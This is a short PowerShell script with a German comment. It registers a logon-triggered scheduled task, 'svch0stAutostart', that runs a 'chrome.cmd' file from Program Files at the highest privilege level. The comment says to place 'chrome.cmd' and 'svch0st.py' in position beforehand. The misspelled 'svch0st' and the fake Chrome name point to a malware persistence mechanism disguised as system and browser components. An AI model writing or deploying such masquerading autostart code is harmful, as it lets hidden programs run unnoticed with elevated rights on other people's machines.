# Bevor dieses Skript ausgeführt wird, füge chrome.cmd und svch0st.py an die richtigen Orte

param (
    [Parameter(Mandatory = $true)]
    [string]$User
)

$action = New-ScheduledTaskAction `
    -Execute "cmd.exe" `
    -Argument "/c `"C:\Program Files\chrome.cmd`""

$trigger = New-ScheduledTaskTrigger -AtLogOn -User "$User"

Register-ScheduledTask `
    -TaskName "svch0stAutostart" `
    -Action $action `
    -Trigger $trigger `
    -User "$User" `
    -RunLevel Highest `
    -Force
